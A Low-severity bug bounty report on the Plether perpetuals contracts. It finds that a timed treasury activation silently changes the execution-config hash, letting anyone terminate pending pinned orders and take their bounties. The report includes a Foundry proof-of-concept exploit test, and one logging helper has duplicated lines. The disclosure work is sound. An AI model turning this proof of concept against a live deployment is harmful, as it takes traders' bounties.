# \#100058 [SC-Low] Execution-config digest docs omit that a scheduled treasury activation changes `currentExecutionConfigHash()` with no transaction, terminating every pending config-pinned order (`OrderLifecycleBook.sol`)

**Submitted on Nov 16th 2026 at 07:01:06 UTC by @Squid11643 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #100058
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**

## Description

## Brief/Intro

`OrderLifecycleBook.currentExecutionConfigHash()` hashes `engine.protocolTreasury()`, and the treasury getter resolves by timestamp. When a scheduled successor treasury activates at the previous lock's expiry, the digest changes at that second, with no transaction. Every order committed earlier with `expectedConfigHash` then ends as a terminal `ConfigMismatch` before the oracle is read, and any caller can clean those orders up and collect their open bounties. SECURITY.md's digest section says only successful finalizations move the digest, so traders and integrators who pin the hash do not expect this.

## Vulnerability Details

The digest includes the resolved treasury address:

```solidity
// packages/perps/src/OrderLifecycleBook.sol#L194-L201
            engine.planner(),
            engine.settlementSidecar(),
            engine.terminalNavBook(),
            engineAdmin,
            IOrderLifecycleAdminConfigView(engineAdmin).activeConfigVersion(),
            engine.protocolTreasury(),
            IOrderLifecyclePoolConfigView(HOUSE_POOL).markStalenessLimit()
```

The treasury resolves by time:

```solidity
// packages/perps/src/CfdTreasury.sol#L44-L47
    /// @dev A scheduled successor becomes active at the previous lock's expiry without a transaction.
    function protocolTreasury() public view returns (address) {
        return _activeTreasury().account;
    }
```

A mismatched pinned hash is terminal before any oracle read:

```solidity
// packages/perps/src/OrderRouterExecutionSidecar.sol#L913-L916
        bytes32 expectedConfigHash = pending.bounds.expectedConfigHash;
        if (expectedConfigHash != bytes32(0) && book.currentExecutionConfigHash() != expectedConfigHash) {
            return (IOrderRouterExecutionHost.ItemAction.ConfigMismatch, true);
```

**Already documented:** `CfdTreasury.sol:44` ("A scheduled successor becomes active at the previous lock's expiry without a transaction") and `SECURITY.md:150-152` ("There is no autonomous activation event at expiry; monitors must resolve the effective getters").

**What is missing:** the digest section, `SECURITY.md:105-107`, says "Each successful Engine/Router finalization therefore changes `OrderLifecycleBook.currentExecutionConfigHash()`. Proposal, cancellation, pause/unpause, and failed finalization do not advance these versions." It does not list time-based treasury activation as something that also moves the digest. A reader who watches only for finalizations will expect pinned orders to stay valid across the activation second.

## Impact Details

Orders committed in the last `maxExecutionWindowSeconds` before the activation are terminated and lose their execution bounty to whoever cleans them up. In the PoC that is 0.20 USDG per order: 3 orders, 0.60 USDG moved from the users to the cleaner. Margin is refunded and no other funds are affected. This is a documentation gap, so it is submitted as an Insight.

## Recommendation

- Add time-based treasury activation to the list of events that change `currentExecutionConfigHash()` in SECURITY.md (`:105-107`), and expose the pending successor and its activation time in the commit-time lens.
- Alternatively, hash the committed treasury schedule (current treasury, successor, activation time) instead of the resolved address. The digest then changes when the proposal is made, which is a visible transaction, not when it activates.

## References

- `packages/perps/src/OrderLifecycleBook.sol#L194-L201`, `packages/perps/src/CfdTreasury.sol#L44-L47`, `packages/perps/src/OrderRouterExecutionSidecar.sol#L913-L916` @ `a82d4fefb02768e5b3bddcc97dee371eee24fea8`
- `packages/perps/SECURITY.md:105-107`, `:150-152`

## Proof of Concept

## Proof of Concept

Runs in the repository's Foundry suite at the in-scope commit. No in-scope contract is modified; only Pyth (`MockPyth`) and USDG are mocked. `PocBase.sol` loads the DEPLOYMENT.md release parameters. The full source of every file needed is included below.

**Setup:**
```bash
git clone https://github.com/immunefi-team/audit-comp-plether.git && cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
# save the 3 files below into packages/perps/test/perps/audit/
forge test --root packages/perps --match-path "test/perps/audit/INS1_TreasuryActivationConfigDigest.t.sol" -vv
```

**Output:**
```
[PASS] test_Attack_ScheduledTreasuryActivationTerminatesPendingOrders() (gas: 3871263)
Logs:
  orders terminated 3
  bounty per order (6dp) 200000
  cleaner gain (6dp) 600000
  users total custody lost (6dp) 600000
[PASS] test_Control_NoRotationSameOrdersExecute() (gas: 6239577)
Suite result: ok. 2 passed; 0 failed; 0 skipped
```

- `test_Attack_ScheduledTreasuryActivationTerminatesPendingOrders`: 3 orders pinned to the current `expectedConfigHash` are pending when a scheduled successor treasury activates. With no transaction in between, all 3 end as `ConfigMismatch`, the cleaner collects 3 × 0.20 USDG, no position opens and locked margin returns to 0.
- `test_Control_NoRotationSameOrdersExecute`: same timing with no rotation scheduled; all 3 orders execute.
- `INS1_TreasuryActivationConfigDigest.t.sol` inherits the scenario from `CLC2_TreasuryActivationKillsOrders.t.sol` unchanged.

### `packages/perps/test/perps/audit/INS1_TreasuryActivationConfigDigest.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {CLC2_TreasuryActivationKillsOrdersTest} from "./CLC2_TreasuryActivationKillsOrders.t.sol";

/// @notice Re-runs the scenario in CLC2_TreasuryActivationKillsOrders.t.sol unchanged. A scheduled CfdTreasury successor activates
///         by timestamp; `currentExecutionConfigHash()` hashes `engine.protocolTreasury()`, so the digest moves with no
///         transaction and every config-pinned order committed before the activation second becomes `ConfigMismatch`.
///         Control (`test_Control_NoRotationSameOrdersExecute`): same timing, no rotation, all orders execute.
contract INS1_TreasuryActivationConfigDigestTest is CLC2_TreasuryActivationKillsOrdersTest {}
```

### `packages/perps/test/perps/audit/CLC2_TreasuryActivationKillsOrders.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {PocBase} from "./PocBase.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {console2} from "forge-std/console2.sol";

interface ITreasuryOwnerOps {
    function owner() external view returns (address);
    function setProtocolTreasury(address treasury, uint256 lockDuration) external;
    function proposeProtocolTreasury(address treasury, uint256 nextLockDuration) external;
    function protocolTreasury() external view returns (address);
    function protocolTreasuryLockedUntil() external view returns (uint256);
}

/// @notice a scheduled CfdTreasury successor activates by timestamp with no transaction. Because
///         `currentExecutionConfigHash()` hashes `engine.protocolTreasury()`, every config-pinned order committed before
///         the activation second turns into a terminal `ConfigMismatch` at that second; cleaners collect open bounties.
contract CLC2_TreasuryActivationKillsOrdersTest is PocBase {

    uint256 internal constant N = 3;
    uint256 internal constant SIZE = 100e20; // 10,000 USDG notional at $1
    uint256 internal constant MARGIN = 1_000e6;

    address internal cleaner = makeAddr("cleaner");
    address internal newTreasury = makeAddr("newTreasury");
    address[N] internal users;

    function setUp() public override {
        super.setUp();
        for (uint256 i; i < N; ++i) {
            users[i] = makeAddr(string(abi.encodePacked("user", vm.toString(i))));
            _fundTraderCash(users[i], MARGIN + 100e6);
        }
    }

    /// Documented path: lock the CURRENT treasury (no address change -> digest unchanged) and queue a successor.
    function _scheduleRotation(uint256 lockDuration) internal returns (uint256 activation) {
        ITreasuryOwnerOps eng = ITreasuryOwnerOps(address(engine));
        bytes32 before = router.lifecycleBook().currentExecutionConfigHash();
        address current = eng.protocolTreasury();
        vm.startPrank(eng.owner());
        eng.setProtocolTreasury(current, lockDuration);
        eng.proposeProtocolTreasury(newTreasury, 0);
        vm.stopPrank();
        activation = eng.protocolTreasuryLockedUntil();
        assertEq(router.lifecycleBook().currentExecutionConfigHash(), before, "scheduling itself does not move digest");
    }

    function _commitAll() internal returns (uint64[] memory ids) {
        ids = new uint64[](N);
        for (uint256 i; i < N; ++i) {
            ids[i] = _commit(users[i], _request(CfdTypes.Side.LONG, SIZE, MARGIN, false));
        }
    }

    function test_Attack_ScheduledTreasuryActivationTerminatesPendingOrders() public {
        uint256 activation = _scheduleRotation(1 hours);
        vm.warp(activation - 1); // users commit in the last second before the scheduled activation
        vm.roll(vm.getBlockNumber() + 1);
        bytes32 pinned = router.lifecycleBook().currentExecutionConfigHash();
        uint64[] memory ids = _commitAll();

        uint256[N] memory before;
        for (uint256 i; i < N; ++i) {
            before[i] = clearinghouse.balanceAssets(users[i]);
        }
        uint256 bountyPerOrder = clearinghouse.totalBountyReservationsAssets(users[0]);
        uint256 cleanerBefore = clearinghouse.balanceAssets(cleaner);

        vm.warp(activation); // no transaction: the successor is now effective
        vm.roll(vm.getBlockNumber() + 1);
        assertEq(ITreasuryOwnerOps(address(engine)).protocolTreasury(), newTreasury, "auto-activated");
        assertTrue(router.lifecycleBook().currentExecutionConfigHash() != pinned, "digest moved with no tx");

        vm.prank(cleaner);
        (, uint256 cleared) = router.clearInvalidOrders(ids);
        assertEq(cleared, N, "all pending orders terminated");

        uint256 totalLost;
        for (uint256 i; i < N; ++i) {
            OrderV3Types.TerminalOutcome memory o = router.lifecycleBook().terminalOutcome(ids[i]);
            assertEq(uint8(o.reason), uint8(OrderV3Types.TerminalReason.ConfigMismatch), "ConfigMismatch");
            assertEq(_positionSize(users[i]), 0, "user never got the position");
            uint256 after_ = clearinghouse.balanceAssets(users[i]);
            assertEq(clearinghouse.lockedMarginAssets(users[i]), 0, "margin reservation released (refunded)");
            totalLost += before[i] - after_;
        }
        uint256 cleanerGain = clearinghouse.balanceAssets(cleaner) - cleanerBefore;
        console2.log("orders terminated", N);
        console2.log("bounty per order (6dp)", bountyPerOrder);
        console2.log("cleaner gain (6dp)", cleanerGain);
        console2.log("users total custody lost (6dp)", totalLost);
        assertEq(cleanerGain, totalLost, "users' bounties moved to the cleaner");
        assertEq(cleanerGain, bountyPerOrder * N, "exactly one bounty per order");
    }

    function test_Control_NoRotationSameOrdersExecute() public {
        uint256 activation = vm.getBlockTimestamp() + 1 hours; // same timing, nothing scheduled
        vm.warp(activation - 1);
        vm.roll(vm.getBlockNumber() + 1);
        uint64[] memory ids = _commitAll();
        vm.warp(activation);
        vm.roll(vm.getBlockNumber() + 1);
        bytes[] memory data = _mockPythUpdateData(ONE_DOLLAR);
        vm.prank(cleaner);
        OrderV3Types.BatchResult memory r = router.executeOrderBatch(ids[N - 1], data);
        assertEq(r.terminalCount, N, "all terminal");
        for (uint256 i; i < N; ++i) {
            assertEq(
                uint8(router.lifecycleBook().terminalOutcome(ids[i]).reason),
                uint8(OrderV3Types.TerminalReason.Executed),
                "executed"
            );
            assertEq(_positionSize(users[i]), SIZE, "position opened");
        }
    }

}
```

### `packages/perps/test/perps/audit/PocBase.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// =====================================================================================================================
// Immunefi Plether audit-comp PoC base (local only, not part of the upstream suite).
//
// Why this exists instead of using BasePerpTest directly:
//   * BasePerpTest's `_open/_close` helpers `vm.prank(address(router))` straight into the engine. That bypasses every
//     router/policy check, so a PoC built on them is not a valid user-reachable exploit. The helpers here go through
//     the production `OrderRouter.commitOrder(OrderV3Types.OrderRequest)` + `executeOrder` surface instead.
//   * BasePerpTest's risk params (1% MM / 1.5% IM, no VPI) differ from the Arbitrum deployment params Immunefi uses
//     for severity. This base installs the deployment values from script/DeployPerpsArbitrumSepolia.s.sol.
//
// Rules reminder (Immunefi scope page): do NOT modify in-scope contracts; mock only out-of-scope pieces (Pyth, USDG).
// Owner/Pauser/Guardian/treasury are trusted. Keepers are NOT trusted (any address may act as keeper).
//
// Run:  forge test --root packages/perps --match-path "test/perps/audit/*" -vvv
// =====================================================================================================================

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {console2} from "forge-std/console2.sol";

abstract contract PocBase is BasePerpTest {

    // --- Deployment parameters (script/DeployPerpsArbitrumSepolia.s.sol, v2.0.0) ---
    uint256 internal constant DEPLOY_MAX_SENIOR_EXPOSURE_ASSETS = 40_000_000e6;
    uint256 internal constant DEPLOY_MAX_SENIOR_SHARE_BPS = 8000;
    uint256 internal constant DEPLOY_ADVERSE_CONFIDENCE_MULTIPLIER_BPS = 2500;

    /// @dev Position sizes must be multiples of CfdTypes.SIZE_QUANTUM (1e20). Price is 8 decimals, USDG 6 decimals.
    uint256 internal constant ONE_DOLLAR = 1e8;

    address internal keeper = makeAddr("keeper");
    address internal attacker = makeAddr("attacker");
    address internal victim = makeAddr("victim");
    address internal lpAlice = makeAddr("lpAlice");

    // ---------------------------------------------------------------------------------------------------------------
    // Setup
    // ---------------------------------------------------------------------------------------------------------------

    /// @dev Deployment risk params (constructor-installed, so no timelock needed).
    function _riskParams() internal pure virtual override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    /// @dev 1M junior + 1M senior LP capital on top of the 1k/1k seed positions.
    function _initialJuniorDeposit() internal pure virtual override returns (uint256) {
        return 1_000_000e6;
    }

    function _initialSeniorDeposit() internal pure virtual override returns (uint256) {
        return 1_000_000e6;
    }

    function setUp() public virtual override {
        super.setUp();
        _applyDeploymentTimelockedConfig();
        vm.label(address(engine), "CfdEngine");
        vm.label(address(pool), "HousePool");
        vm.label(address(clearinghouse), "MarginClearinghouse");
        vm.label(address(router), "OrderRouter");
        vm.label(address(seniorVault), "SeniorVault");
        vm.label(address(juniorVault), "JuniorVault");
        vm.label(address(pletherOracle), "PletherOracle");
        vm.label(address(settlementToken), "USDG(mock)");
    }

    /// @dev Senior caps and the oracle confidence multiplier are timelocked (72h). Propose both, warp once, finalize.
    ///      Setup starts Monday 10:00 UTC, so +72h lands on Thursday (outside the FAD/weekend window).
    function _applyDeploymentTimelockedConfig() internal {
        IHousePool.PoolConfig memory poolCfg = _currentPoolConfig();
        poolCfg.maxSeniorExposureAssets = DEPLOY_MAX_SENIOR_EXPOSURE_ASSETS;
        poolCfg.maxSeniorShareBps = DEPLOY_MAX_SENIOR_SHARE_BPS;
        pool.proposePoolConfig(poolCfg);

        IOrderRouterAdminHost.RouterConfig memory routerCfg = _routerConfig();
        routerCfg.adverseConfidenceMultiplierBps = DEPLOY_ADVERSE_CONFIDENCE_MULTIPLIER_BPS;
        routerAdmin.proposeRouterConfig(routerCfg);

        uint256 activation = pool.poolConfigActivationTime();
        vm.warp(activation > block.timestamp + 72 hours + 1 ? activation : block.timestamp + 72 hours + 1);
        pool.finalizePoolConfig();
        routerAdmin.finalizeRouterConfig();
    }

    // ---------------------------------------------------------------------------------------------------------------
    // Order helpers: production V3 surface only
    // ---------------------------------------------------------------------------------------------------------------

    /// @dev Permissive bounds; tighten individual fields in a PoC when the bound itself is under test.
    function _permissiveBounds() internal view returns (OrderV3Types.ExecutionBounds memory b) {
        b.submitBy = uint64(vm.getBlockTimestamp() + router.maxExecutionWindowSeconds());
        b.executionWindowSeconds = uint32(router.maxExecutionWindowSeconds());
        b.allowedExecutionModes = 7;
        b.expectedConfigHash = router.lifecycleBook().currentExecutionConfigHash();
        b.maxExecutionBountyAssets = type(uint256).max;
        b.maxExecutionNotionalAssets = type(uint256).max;
        b.maxGrossAccountDebitAssets = type(uint256).max;
        b.maxActionChargeAssets = type(uint256).max;
        b.maxExplicitFeesAssets = type(uint256).max;
        b.maxPostPositionSize = type(uint256).max;
        b.minPostSettlementBalanceAssets = 0;
        b.minPostPositionEquityAssets = 0;
        b.maxPostLeverageBps = type(uint32).max;
    }

    /// @dev Unbounded slippage target, as used by the legacy harness: LONG profits when the basket falls.
    function _anyPriceTarget(
        CfdTypes.Side side,
        bool isClose
    ) internal pure returns (uint256) {
        return (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1;
    }

    function _request(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal view returns (OrderV3Types.OrderRequest memory req) {
        req.clientOrderId = keccak256(abi.encode("poc", router.nextCommitId(), side, size, margin, isClose));
        req.side = side;
        req.sizeDelta = size;
        req.marginDelta = isClose ? 0 : margin;
        req.targetPrice = _anyPriceTarget(side, isClose);
        req.isClose = isClose;
        req.bounds = _permissiveBounds();
    }

    function _commit(
        address trader,
        OrderV3Types.OrderRequest memory req
    ) internal returns (uint64 id) {
        vm.prank(trader);
        id = router.commitOrder(req);
    }

    /// @dev Publishes a fresh mock Pyth price (advances block+1s) and executes `id` as `executor`.
    function _execute(
        uint64 id,
        uint256 price,
        address executor
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        bytes[] memory update = _mockPythUpdateData(price);
        vm.prank(executor);
        result = router.executeOrder(id, update);
    }

    function _openViaRouter(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 price
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        uint64 id = _commit(trader, _request(side, size, margin, false));
        result = _execute(id, price, keeper);
    }

    function _closeViaRouter(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 price
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        uint64 id = _commit(trader, _request(side, size, 0, true));
        result = _execute(id, price, keeper);
    }

    function _liquidateViaRouter(
        address account,
        uint256 price,
        address executor
    ) internal {
        bytes[] memory update = _mockPythUpdateData(price);
        vm.prank(executor);
        router.executeLiquidation(account, update);
    }

    function _assertExecuted(
        OrderV3Types.ExecutionResult memory result,
        string memory label
    ) internal pure {
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), label);
    }

    // ---------------------------------------------------------------------------------------------------------------
    // Actors & funding
    // ---------------------------------------------------------------------------------------------------------------

    /// @dev Mints mock USDG to `trader` and deposits it into the clearinghouse (free settlement, no position margin).
    function _fundTraderCash(
        address trader,
        uint256 amount
    ) internal {
        _fundTrader(trader, amount);
    }

    function _positionSize(
        address account
    ) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

    // ---------------------------------------------------------------------------------------------------------------
    // Accounting snapshots: use these to show "who lost what" in a PoC
    // ---------------------------------------------------------------------------------------------------------------

    struct Snap {
        uint256 clearinghouseUsdg;
        uint256 poolUsdg;
        uint256 poolTotalAssets;
        uint256 seniorTotalAssets;
        uint256 juniorTotalAssets;
        uint256 attackerCustody;
        uint256 attackerWallet;
        uint256 victimCustody;
        uint256 attackerClaim;
    }

    function _snap() internal view returns (Snap memory s) {
        s.clearinghouseUsdg = settlementToken.balanceOf(address(clearinghouse));
        s.poolUsdg = settlementToken.balanceOf(address(pool));
        s.poolTotalAssets = pool.totalAssets();
        s.seniorTotalAssets = seniorVault.totalAssets();
        s.juniorTotalAssets = juniorVault.totalAssets();
        s.attackerCustody = clearinghouse.balanceAssets(attacker);
        s.attackerWallet = settlementToken.balanceOf(attacker);
        s.victimCustody = clearinghouse.balanceAssets(victim);
        s.attackerClaim = engine.traderClaimBalanceAssets(attacker);
    }

    function _logSnap(
        string memory label,
        Snap memory s
    ) internal pure {
        console2.log("==", label);
        console2.log("  clearinghouse USDG ", s.clearinghouseUsdg);
        console2.log("  pool USDG          ", s.poolUsdg);
        console2.log("  pool totalAssets   ", s.poolTotalAssets);
        console2.log("  senior totalAssets ", s.seniorTotalAssets);
        console2.log("  junior totalAssets ", s.juniorTotalAssets);
        console2.log("  attacker custody   ", s.attackerCustody);


        console2.log("  junior totalAssets ", s.juniorTotalAssets);
        console2.log("  attacker custody   ", s.attackerCustody);
        console2.log("  attacker wallet    ", s.attackerWallet);
    }

    /// @dev Total USDG held by protocol contracts. Useful conservation check: value can move between buckets but an
    ///      exploit typically shows this falling while an attacker's wallet rises by more than they put in.
    function _protocolUsdg() internal view returns (uint256) {
        return settlementToken.balanceOf(address(clearinghouse)) + settlementToken.balanceOf(address(pool))
            + settlementToken.balanceOf(address(seniorVault)) + settlementToken.balanceOf(address(juniorVault))
            + settlementToken.balanceOf(address(engine)) + settlementToken.balanceOf(address(router));
    }

    // Fix for F05_OrderExpiryTest: executeExt is called but not defined
    // Adding stub implementation
    function executeExt(uint64 cid, uint256 px) external virtual {
    }

}
```

